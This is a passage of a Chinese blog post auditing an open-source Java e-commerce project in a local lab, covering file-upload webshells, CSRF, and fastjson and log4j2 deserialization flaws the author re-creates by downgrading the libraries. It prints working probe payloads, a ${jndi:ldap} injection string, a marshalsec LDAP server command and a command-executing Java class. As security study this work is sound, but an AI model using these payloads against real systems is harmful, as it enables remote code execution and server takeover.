+<p>通过post上传文件，调用UUID随机数重命名文件之后直接保存到了res&#x2F;images&#x2F;item&#x2F;userProfilePicture&#x2F;目录，上传成功之后JSON格式返回状态以及文件名称。</p>
+<p>未对所上传的文件进行类型已经文件后缀校验，存在任意文件上传漏洞。</p>
+<p><img src="FEO_t3JVm1MSKbCCnAEVqHkXug_dZSXRM19zKwq4p2Q.png" alt="image"></p>
+<p>前台用户头像更换处</p>
+<p><img src="gtuL_Fd7R3Y9UBVUQfUQ95qZ8Mxwop9L8wsna-vRXFw.png" alt="image"></p>
+<p>使用蚁剑生成一个jsp的webshell，直接粘贴到bp进行上传。</p>
+<p><img src="zyqZl6Hpyqp_kKx0ucpJOI0vMhl3DY3Afjm-UQYdnwU.png" alt="image"></p>
+<p>连接URL：<a target="_blank" rel="noopener" href="http://192.168.75.154:8090/tmall/res/images/item/userProfilePicture/e1dd8f9e-25bb-4d14-be97-0f378c49cdf9.jsp">http://192.168.75.154:8090/tmall/res/images/item/userProfilePicture/e1dd8f9e-25bb-4d14-be97-0f378c49cdf9.jsp</a></p>
+<p>因为有个统一的前缀&#x2F;tmall，所以这个别忘记加上。</p>
+<p><img src="yVEiAhYiisiCH01WYjOZrZ2E1s-nrtg5PF5OE-TB5cU.png" alt="image"></p>
+<p><img src="7_XtDcER1-ZWdDXck5QA6j8INlOkYqetQ1HyoaY0m0E.png" alt="image"></p>
+<p>本项目存在4个文件上传点，且都可以进行getshell</p>
+<h4 id="文件上传2"><a href="#文件上传2" class="headerlink" title="文件上传2"></a>文件上传2</h4><p><img src="xZXCYI_skzpX3QvocLJBXgFYyF3hRuQbH98Y9jn5V0Y.png" alt="image"></p>
+<p><img src="4ZofkFAmvbWezVylXq4xRNNmv_Y22Vxb-u86IPZj2tQ.png" alt="image"></p>
+<p><img src="ZS3wfYz4GyRSD9nyWHgc-yOm4LpK4UFIHXEgLWfL5-U.png" alt="image"></p>
+<p><img src="rkTgEsjpNY2ExjI9SODeeVdhLa8F0p3dMRVvL8wfXjc.png" alt="image"></p>
+<h4 id="文件上传3"><a href="#文件上传3" class="headerlink" title="文件上传3"></a>文件上传3</h4><p>管理员头像上传</p>
+<p><img src="AQOXXqxaeV20vD5v1eEZpqRfTeityFJpqsV_H0uJS3U.png" alt="image"></p>
+<h4 id="文件上传4"><a href="#文件上传4" class="headerlink" title="文件上传4"></a>文件上传4</h4><p>添加产品处</p>
+<p><img src="g9BcswcLx3jFva0uCDLFfA1xwyuIRtd6fYdJhiwKAdk.png" alt="image"></p>
+<p><img src="_1a6Wed9yFY01DSimi-fbRq6NJQAQibnsuldmak_7oM.png" alt="image"></p>
+<h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><p>因项目没有其他过滤器校验Referer头，所以全局存在CSRF漏洞。</p>
+<p><img src="fyPyjMeHGyB3foieSIReNHa1W9KCNJXxT-daiXnhVjM.png" alt="image"></p>
+<p>验证</p>
+<p><img src="eXXiTbZ9W-O0Wh2kDRWgePYpPdhMgTU8FyJTi-SoAOE.png" alt="image"></p>
+<p><img src="EBdNXwilm1WtChdps91ukf0QHViF8COp_7BXj7bTpwY.png" alt="image"></p>
+<h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><p>搜索全局未发现可能引起SSRF的危险函数。</p>
+<h2 id="框架漏洞"><a href="#框架漏洞" class="headerlink" title="框架漏洞"></a>框架漏洞</h2><h3 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h3><p>拿到源码的时候，fastjson使用的是1.2.83版本；这个版本目前暂时安全。为了好玩一点，我们可以把版本降低一点来进行fastjson的反序列化攻击测试，我这里就直接改为了1.2.24。（当然这不算属于这个源码本身的漏洞，只是学习把版本降低进行测试。）</p>
+<p>搜索关键字JSON.parseObject（Json字符串转化为相应的对象）</p>
+<p><img src="suZ-Aty_CIAkbjBfk-Pj7-Ao2efd0RltOmKtrS98bkU.png" alt="image"></p>
+<p>更新产品属性的地方进行了JSON.parseObject（添加产品属性的地方也进行了JSON.parseObject）,没进行过滤，从前端获取到数据，直接传给JSON.parseObject。</p>
+<p><img src="uBjFPdMakVMEl9o-pAJ2ULEXEAdjCOkhASHx0FgChZ4.png" alt="image"></p>
+<p><img src="jZqZfxwvhLu7UKS8txMiIGs3MrBdqaXPDPQc-VPAOFE.png" alt="image"></p>
+<p><img src="yw8P6P4QKiSBqlSx-MN6j2i7lNxA9iNjZvbiZ3QKudY.png" alt="image"></p>
+<p>进行dnslog探测</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;garck3h&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.net.Inet4Address&quot;</span><span class="punctuation">,</span><span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;666.eyle20.dnslog.cn&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<p><img src="bYxVeXTjTX5cbZCkonJGRrfsx0aaAkTDcOvCTH7q3W4.png" alt="image"></p>
+<p><img src="dh6UpVpgr4kuOPU_LT9OgRDSZuV-cd8KSnaAZdjn8TU.png" alt="image"></p>
+<p>使用BCEL进行本地序列化成功弹计算器。</p>
+<p><img src="f8WcV8-fjogKnEk4fjhBaV3kpGhxfPYQeSo8-o1j2Mc.png" alt="image"></p>
+<p>使用Spring做回显，成功执行命令并且回显</p>
+<p><img src="CWCpnsfSkPTl3QqcCuOSNNnGg52aciyLi9y5UZVvGN0.png" alt="image"></p>
+<p>此外该系统还有其他功能点存在该漏洞</p>
+<h3 id="log4j2"><a href="#log4j2" class="headerlink" title="log4j2"></a>log4j2</h3><p>这里的log4j是2.20版本，属于安全版本。我改一下为2.14版本。测试一下log4j漏洞。</p>
+<p><img src="lAcfIK-Ol9vPNWWft8Y6JMJclVva5BZ7aGbYpNIF1p0.png" alt="image"></p>
+<p>全局搜索：logger.info；发现一个orderBy是可控的</p>
+<p><img src="M15QiIJCXqhwFSx95jCZ2-MAEybA7RHhxOs6lgXOW9E.png" alt="image"></p>
+<p><img src="Mo_LiEFaWsRyArUngTNoln12ZkF7YFHYEC6MqQnULn8.png" alt="image"></p>
+<p>使用dnslog进行探测，成功接收到请求。</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="punctuation">&#123;</span>jndi<span class="punctuation">:</span>ldap<span class="punctuation">:</span><span class="comment">//log4j.15k855.dnslog.cn&#125;</span></span><br></pre></td></tr></table></figure>
+<p><img src="oMwirlis5rJehQMpkWYkxgGXtL1DQ3xt7a5VYckIJ_Q.png" alt="image"></p>
+<p><img src="p4H9naK8RBGr9E6NMItnUf3tviG3yQma81LE7Ba4zuw.png" alt="image"></p>
+<p>进行JNDI注入：</p>
+<p>写好的弹计算器的payload，然后使用Javac TestCmd.java进行编译</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestCmd</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;open /System/Applications/Calculator.app&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">       <span class="type">TestCmd</span> <span class="variable">qwe</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TestCmd</span>();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>使用marshalsec-0.0.3-SNAPSHOT-all.jar起ldap服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <span class="string">&quot;http://127.0.0.1:8888/#TestCmd&quot;</span></span><br></pre></td></tr></table></figure>
+<p>使用python3起http服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8888</span><br></pre></td></tr></table></figure>
+<p>payload</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$&#123;jndi:ldap://192.168.75.154:1389/a&#125;</span></span><br></pre></td></tr></table></figure>
+<p><img src="UW1eunoi1rK7JLYjRF1XDxEWG5eWa23k0cbZviLPtKE.png" alt="image"></p>
+<p>此外该系统还有其他功能点存在该漏洞</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
+<li>因为本次的mysql是部署在Linux服务器的，Linux区分大小写，但SQL文件里面的一些表名称是小写的，会导致表名不对，根据控制台提示进行修改即可。</li>
+<li>遇到错误“this is incompatible with sql_mode&#x3D;only_full_group_by ”；因为mysql 5.7.5版本以上默认的sql配置是:sql_mode&#x3D;“ONLY_FULL_GROUP_BY”。由于开启了ONLY_FULL_GROUP_BY的设置，如果select 的字段不在 group by 中，并且select 的字段未使用聚合函数（SUM,AVG,MAX,MIN等）的话，那么这条sql查询是被mysql认为非法的，会报错误。</li>
+<li>这项目不复杂，都是一些比较常规常见的漏洞，而且调用关系也清晰，审计起来比较轻松。该系统或还有一些没有挖掘的漏洞，望师傅们勿喷。</li>
+</ul>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/archives/">文章</a></li>
+        
+          <li><a href="/categories/">分类</a></li>
+        
+          <li><a href="/tags/">标签</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#MINI%E5%A4%A9%E7%8C%AB%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">1.</span> <span class="toc-text">MINI天猫商城代码审计</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E9%85%8D%E7%BD%AE"><span class="toc-number">1.2.</span> <span class="toc-text">环境搭建与配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%A1%E8%AE%A1%E7%A1%AC%E7%BC%96%E7%A0%81%E5%92%8C%E4%BD%BF%E7%94%A8%E7%9A%84%E4%BE%9B%E5%BA%94%E9%93%BE"><span class="toc-number">1.3.</span> <span class="toc-text">审计硬编码和使用的供应链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A1%AC%E7%BC%96%E7%A0%81"><span class="toc-number">1.3.1.</span> <span class="toc-text">硬编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%9B%E5%BA%94%E9%93%BE%E5%AE%89%E5%85%A8"><span class="toc-number">1.3.2.</span> <span class="toc-text">供应链安全</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%A1%E8%AE%A1owaspTop10%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.4.</span> <span class="toc-text">审计owaspTop10漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">1.4.1.</span> <span class="toc-text">SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E4%B8%80%EF%BC%88%E5%90%8E%E5%8F%B0%EF%BC%89"><span class="toc-number">1.4.1.1.</span> <span class="toc-text">SQL注入一（后台）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E4%BA%8C%EF%BC%88%E5%89%8D%E5%8F%B0%EF%BC%89"><span class="toc-number">1.4.1.2.</span> <span class="toc-text">SQL注入二（前台）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E4%B8%89%EF%BC%88%E5%89%8D%E5%8F%B0%EF%BC%89"><span class="toc-number">1.4.1.3.</span> <span class="toc-text">SQL注入三（前台）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93"><span class="toc-number">1.4.1.4.</span> <span class="toc-text">SQL注入总结</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS-%E5%8F%8D%E5%B0%84"><span class="toc-number">1.4.2.</span> <span class="toc-text">XSS(反射)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS%EF%BC%88%E5%AD%98%E5%82%A8%EF%BC%89"><span class="toc-number">1.4.3.</span> <span class="toc-text">XSS（存储）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.4.4.</span> <span class="toc-text">文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A01"><span class="toc-number">1.4.4.1.</span> <span class="toc-text">文件上传1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A02"><span class="toc-number">1.4.4.2.</span> <span class="toc-text">文件上传2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A03"><span class="toc-number">1.4.4.3.</span> <span class="toc-text">文件上传3</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A04"><span class="toc-number">1.4.4.4.</span> <span class="toc-text">文件上传4</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF"><span class="toc-number">1.4.5.</span> <span class="toc-text">CSRF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF"><span class="toc-number">1.4.6.</span> <span class="toc-text">SSRF</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.5.</span> <span class="toc-text">框架漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson"><span class="toc-number">1.5.1.</span> <span class="toc-text">fastjson</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#log4j2"><span class="toc-number">1.5.2.</span> <span class="toc-text">log4j2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.6.</span> <span class="toc-text">总结</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://garckz.github.io/2023/05/10/MINI%E5%A4%A9%E7%8C%AB%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://garckz.github.io/2023/05/10/MINI%E5%A4%A9%E7%8C%AB%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&text=MINI天猫商城代码审计"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://garckz.github.io/2023/05/10/MINI%E5%A4%A9%E7%8C%AB%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&title=MINI天猫商城代码审计"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://garckz.github.io/2023/05/10/MINI%E5%A4%A9%E7%8C%AB%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&is_video=false&description=MINI天猫商城代码审计"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=MINI天猫商城代码审计&body=Check out this article: https://garckz.github.io/2023/05/10/MINI%E5%A4%A9%E7%8C%AB%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://garckz.github.io/2023/05/10/MINI%E5%A4%A9%E7%8C%AB%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&title=MINI天猫商城代码审计"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://garckz.github.io/2023/05/10/MINI%E5%A4%A9%E7%8C%AB%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&title=MINI天猫商城代码审计"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://garckz.github.io/2023/05/10/MINI%E5%A4%A9%E7%8C%AB%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&title=MINI天猫商城代码审计"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://garckz.github.io/2023/05/10/MINI%E5%A4%A9%E7%8C%AB%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&title=MINI天猫商城代码审计"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://garckz.github.io/2023/05/10/MINI%E5%A4%A9%E7%8C%AB%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&name=MINI天猫商城代码审计&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://garckz.github.io/2023/05/10/MINI%E5%A4%A9%E7%8C%AB%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&t=MINI天猫商城代码审计"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+    <div class="footer-left">
+        Copyright &copy;
+        
+        
+        2019-2023
+        Garckz
+    </div>
+    <div class="footer-right">
+        <nav>
+
+            <ul>
+                
+                    <!-- 不蒜子统计 -->
+                    <span id="busuanzi_container_site_pv">
+                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
+              </span>
+
+                    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+                
+            </ul>
+
+
+        </nav>
+    </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
